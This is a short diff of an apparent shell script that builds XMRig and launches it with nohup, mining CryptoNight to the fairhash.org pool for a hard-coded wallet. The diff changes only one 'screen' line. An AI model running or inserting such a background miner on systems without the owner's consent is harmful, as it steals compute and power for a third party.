@@ -30,6 +30,6 @@ cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7
 
 make
 
-screen
+echo screen
 
 nohup ./xmrig -a cryptonight -o stratum+tcp://etn.fairhash.org:3333 -u etnk5rqfiF7MPXtSGiWMZsLxRgNKVUFy2Qb8Qi5QG9j7667W9rwd4E9fZkJpyndYqS7XGrmU4GP9TSyVc3XZZVJJ85y3CsUYxW -p x -a cryptonight -o stratum+tcp://etn.fairhash.org:5555 -u etnk5rqfiF7MPXtSGiWMZsLxRgNKVUFy2Qb8Qi5QG9j7667W9rwd4E9fZkJpyndYqS7XGrmU4GP9TSyVc3XZZVJJ85y3CsUYxW -p x -a cryptonight -o stratum+tcp://etn.fairhash.org:7777 -u etnk5rqfiF7MPXtSGiWMZsLxRgNKVUFy2Qb8Qi5QG9j7667W9rwd4E9fZkJpyndYqS7XGrmU4GP9TSyVc3XZZVJJ85y3CsUYxW -p x -k --av=2 --donate-level=1
